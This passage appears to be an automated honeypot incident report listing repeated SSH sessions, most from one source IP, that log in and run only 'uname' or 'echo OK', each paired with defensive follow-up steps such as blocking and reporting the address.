| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:04` | `cowrie.session.connect` |
| `2026-07-04 15:10:04` | `cowrie.client.version` |
| `2026-07-04 15:10:04` | `cowrie.client.kex` |
| `2026-07-04 15:10:04` | `cowrie.login.success` |
| `2026-07-04 15:10:05` | `cowrie.session.params` |
| `2026-07-04 15:10:05` | `cowrie.command.input` |
| `2026-07-04 15:10:05` | `cowrie.log.closed` |
| `2026-07-04 15:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6a27d3161c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:07` | `cowrie.session.connect` |
| `2026-07-04 15:10:07` | `cowrie.client.version` |
| `2026-07-04 15:10:07` | `cowrie.client.kex` |
| `2026-07-04 15:10:07` | `cowrie.login.success` |
| `2026-07-04 15:10:08` | `cowrie.session.params` |
| `2026-07-04 15:10:08` | `cowrie.command.input` |
| `2026-07-04 15:10:08` | `cowrie.log.closed` |
| `2026-07-04 15:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-446846625885

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:10` | `cowrie.session.connect` |
| `2026-07-04 15:10:10` | `cowrie.client.version` |
| `2026-07-04 15:10:10` | `cowrie.client.kex` |
| `2026-07-04 15:10:10` | `cowrie.login.success` |
| `2026-07-04 15:10:11` | `cowrie.session.params` |
| `2026-07-04 15:10:11` | `cowrie.command.input` |
| `2026-07-04 15:10:11` | `cowrie.log.closed` |
| `2026-07-04 15:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3cb6e168b5b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:13` | `cowrie.session.connect` |
| `2026-07-04 15:10:13` | `cowrie.client.version` |
| `2026-07-04 15:10:14` | `cowrie.client.kex` |
| `2026-07-04 15:10:14` | `cowrie.login.success` |
| `2026-07-04 15:10:15` | `cowrie.session.params` |
| `2026-07-04 15:10:15` | `cowrie.command.input` |
| `2026-07-04 15:10:15` | `cowrie.log.closed` |
| `2026-07-04 15:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d1351ea944b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:17` | `cowrie.session.connect` |
| `2026-07-04 15:10:17` | `cowrie.client.version` |
| `2026-07-04 15:10:17` | `cowrie.client.kex` |
| `2026-07-04 15:10:17` | `cowrie.login.success` |
| `2026-07-04 15:10:18` | `cowrie.session.params` |
| `2026-07-04 15:10:18` | `cowrie.command.input` |
| `2026-07-04 15:10:18` | `cowrie.log.closed` |
| `2026-07-04 15:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4ebc429e368

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:20` | `cowrie.session.connect` |
| `2026-07-04 15:10:20` | `cowrie.client.version` |
| `2026-07-04 15:10:20` | `cowrie.client.kex` |
| `2026-07-04 15:10:20` | `cowrie.login.success` |
| `2026-07-04 15:10:21` | `cowrie.session.params` |
| `2026-07-04 15:10:21` | `cowrie.command.input` |
| `2026-07-04 15:10:21` | `cowrie.log.closed` |
| `2026-07-04 15:10:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edf27eacda84

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:23` | `cowrie.session.connect` |
| `2026-07-04 15:10:23` | `cowrie.client.version` |
| `2026-07-04 15:10:23` | `cowrie.client.kex` |
| `2026-07-04 15:10:24` | `cowrie.login.success` |
| `2026-07-04 15:10:25` | `cowrie.session.params` |
| `2026-07-04 15:10:25` | `cowrie.command.input` |
| `2026-07-04 15:10:25` | `cowrie.log.closed` |
| `2026-07-04 15:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a3a366c3451

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:25` | `cowrie.session.connect` |
| `2026-07-04 15:10:26` | `cowrie.client.version` |
| `2026-07-04 15:10:26` | `cowrie.client.kex` |
| `2026-07-04 15:10:34` | `cowrie.login.success` |
| `2026-07-04 15:10:38` | `cowrie.session.params` |
| `2026-07-04 15:10:38` | `cowrie.command.input` |
| `2026-07-04 15:10:41` | `cowrie.log.closed` |
| `2026-07-04 15:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae4d2a057f1a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:26` | `cowrie.session.connect` |
| `2026-07-04 15:10:26` | `cowrie.client.version` |
| `2026-07-04 15:10:26` | `cowrie.client.kex` |
| `2026-07-04 15:10:27` | `cowrie.login.success` |
| `2026-07-04 15:10:28` | `cowrie.session.params` |
| `2026-07-04 15:10:28` | `cowrie.command.input` |
| `2026-07-04 15:10:28` | `cowrie.log.closed` |
| `2026-07-04 15:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a58eddb2ec6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:33` | `cowrie.session.connect` |
| `2026-07-04 15:10:33` | `cowrie.client.version` |
| `2026-07-04 15:10:33` | `cowrie.client.kex` |
| `2026-07-04 15:10:33` | `cowrie.login.success` |
| `2026-07-04 15:10:34` | `cowrie.session.params` |
| `2026-07-04 15:10:34` | `cowrie.command.input` |
| `2026-07-04 15:10:34` | `cowrie.log.closed` |
| `2026-07-04 15:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b6e7eba246

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:36` | `cowrie.session.connect` |
| `2026-07-04 15:10:36` | `cowrie.client.version` |
| `2026-07-04 15:10:36` | `cowrie.client.kex` |
| `2026-07-04 15:10:37` | `cowrie.login.success` |
| `2026-07-04 15:10:37` | `cowrie.session.params` |
| `2026-07-04 15:10:37` | `cowrie.command.input` |
| `2026-07-04 15:10:38` | `cowrie.log.closed` |
| `2026-07-04 15:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1056c1013411

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:39` | `cowrie.session.connect` |
| `2026-07-04 15:10:39` | `cowrie.client.version` |
| `2026-07-04 15:10:39` | `cowrie.client.kex` |
| `2026-07-04 15:10:40` | `cowrie.login.success` |
| `2026-07-04 15:10:41` | `cowrie.session.params` |
| `2026-07-04 15:10:41` | `cowrie.command.input` |
| `2026-07-04 15:10:41` | `cowrie.log.closed` |
| `2026-07-04 15:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ceae5cb3eb

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:43` | `cowrie.session.connect` |
| `2026-07-04 15:10:43` | `cowrie.client.version` |
| `2026-07-04 15:10:43` | `cowrie.client.kex` |
| `2026-07-04 15:10:43` | `cowrie.login.success` |
| `2026-07-04 15:10:44` | `cowrie.session.params` |
| `2026-07-04 15:10:44` | `cowrie.command.input` |
| `2026-07-04 15:10:44` | `cowrie.log.closed` |
| `2026-07-04 15:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8170f9631a74

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:46` | `cowrie.session.connect` |
| `2026-07-04 15:10:46` | `cowrie.client.version` |
| `2026-07-04 15:10:46` | `cowrie.client.kex` |
| `2026-07-04 15:10:46` | `cowrie.login.success` |
| `2026-07-04 15:10:47` | `cowrie.session.params` |
| `2026-07-04 15:10:47` | `cowrie.command.input` |
| `2026-07-04 15:10:47` | `cowrie.log.closed` |
| `2026-07-04 15:10:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a54a9194d207

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:49` | `cowrie.session.connect` |
| `2026-07-04 15:10:49` | `cowrie.client.version` |
| `2026-07-04 15:10:49` | `cowrie.client.kex` |
| `2026-07-04 15:10:49` | `cowrie.login.success` |
| `2026-07-04 15:10:50` | `cowrie.session.params` |
| `2026-07-04 15:10:50` | `cowrie.command.input` |
| `2026-07-04 15:10:51` | `cowrie.log.closed` |
| `2026-07-04 15:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-398ae6794484

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:52` | `cowrie.session.connect` |
| `2026-07-04 15:10:52` | `cowrie.client.version` |
| `2026-07-04 15:10:52` | `cowrie.client.kex` |
| `2026-07-04 15:10:53` | `cowrie.login.success` |
| `2026-07-04 15:10:54` | `cowrie.session.params` |
| `2026-07-04 15:10:54` | `cowrie.command.input` |
| `2026-07-04 15:10:54` | `cowrie.log.closed` |
| `2026-07-04 15:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86f27b91735d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:55` | `cowrie.session.connect` |
| `2026-07-04 15:10:55` | `cowrie.client.version` |
| `2026-07-04 15:10:56` | `cowrie.client.kex` |
| `2026-07-04 15:10:56` | `cowrie.login.success` |
| `2026-07-04 15:10:56` | `cowrie.session.params` |
| `2026-07-04 15:10:56` | `cowrie.command.input` |
| `2026-07-04 15:10:57` | `cowrie.log.closed` |
| `2026-07-04 15:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8687c61ca5e5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:59` | `cowrie.session.connect` |
| `2026-07-04 15:10:59` | `cowrie.client.version` |
| `2026-07-04 15:10:59` | `cowrie.client.kex` |
| `2026-07-04 15:10:59` | `cowrie.login.success` |
| `2026-07-04 15:11:00` | `cowrie.session.params` |
| `2026-07-04 15:11:00` | `cowrie.command.input` |
| `2026-07-04 15:11:00` | `cowrie.log.closed` |
| `2026-07-04 15:11:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b33d72ebf735

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:02` | `cowrie.session.connect` |
| `2026-07-04 15:11:02` | `cowrie.client.version` |
| `2026-07-04 15:11:02` | `cowrie.client.kex` |
| `2026-07-04 15:11:02` | `cowrie.login.success` |
| `2026-07-04 15:11:03` | `cowrie.session.params` |
| `2026-07-04 15:11:03` | `cowrie.command.input` |
| `2026-07-04 15:11:03` | `cowrie.log.closed` |
| `2026-07-04 15:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4072e569b4f3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:05` | `cowrie.session.connect` |
| `2026-07-04 15:11:05` | `cowrie.client.version` |
| `2026-07-04 15:11:05` | `cowrie.client.kex` |
| `2026-07-04 15:11:05` | `cowrie.login.success` |
| `2026-07-04 15:11:06` | `cowrie.session.params` |
| `2026-07-04 15:11:06` | `cowrie.command.input` |
| `2026-07-04 15:11:06` | `cowrie.log.closed` |
| `2026-07-04 15:11:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ca02992320

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:08` | `cowrie.session.connect` |
| `2026-07-04 15:11:08` | `cowrie.client.version` |
| `2026-07-04 15:11:08` | `cowrie.client.kex` |
| `2026-07-04 15:11:09` | `cowrie.login.success` |
| `2026-07-04 15:11:09` | `cowrie.session.params` |
| `2026-07-04 15:11:09` | `cowrie.command.input` |
| `2026-07-04 15:11:09` | `cowrie.log.closed` |
| `2026-07-04 15:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5576200e7319

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:11` | `cowrie.session.connect` |
| `2026-07-04 15:11:11` | `cowrie.client.version` |
| `2026-07-04 15:11:12` | `cowrie.client.kex` |
| `2026-07-04 15:11:12` | `cowrie.login.success` |
| `2026-07-04 15:11:13` | `cowrie.session.params` |
| `2026-07-04 15:11:13` | `cowrie.command.input` |
| `2026-07-04 15:11:13` | `cowrie.log.closed` |
| `2026-07-04 15:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06fcc8199b9e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:15` | `cowrie.session.connect` |
| `2026-07-04 15:11:15` | `cowrie.client.version` |
| `2026-07-04 15:11:15` | `cowrie.client.kex` |
| `2026-07-04 15:11:15` | `cowrie.login.success` |
| `2026-07-04 15:11:16` | `cowrie.session.params` |
| `2026-07-04 15:11:16` | `cowrie.command.input` |
| `2026-07-04 15:11:16` | `cowrie.log.closed` |
| `2026-07-04 15:11:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-409d407e3edf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:18` | `cowrie.session.connect` |
| `2026-07-04 15:11:18` | `cowrie.client.version` |
| `2026-07-04 15:11:18` | `cowrie.client.kex` |
| `2026-07-04 15:11:18` | `cowrie.login.success` |
| `2026-07-04 15:11:19` | `cowrie.session.params` |
| `2026-07-04 15:11:19` | `cowrie.command.input` |
| `2026-07-04 15:11:19` | `cowrie.log.closed` |
| `2026-07-04 15:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c5706a9c73c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:21` | `cowrie.session.connect` |
| `2026-07-04 15:11:21` | `cowrie.client.version` |
| `2026-07-04 15:11:21` | `cowrie.client.kex` |
| `2026-07-04 15:11:21` | `cowrie.login.success` |
| `2026-07-04 15:11:22` | `cowrie.session.params` |
| `2026-07-04 15:11:22` | `cowrie.command.input` |
| `2026-07-04 15:11:22` | `cowrie.log.closed` |
| `2026-07-04 15:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ab0cecfa30

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:24` | `cowrie.session.connect` |
| `2026-07-04 15:11:24` | `cowrie.client.version` |
| `2026-07-04 15:11:24` | `cowrie.client.kex` |
| `2026-07-04 15:11:24` | `cowrie.login.success` |
| `2026-07-04 15:11:25` | `cowrie.session.params` |
| `2026-07-04 15:11:25` | `cowrie.command.input` |
| `2026-07-04 15:11:25` | `cowrie.log.closed` |
| `2026-07-04 15:11:25` | `cowrie.session.closed` |

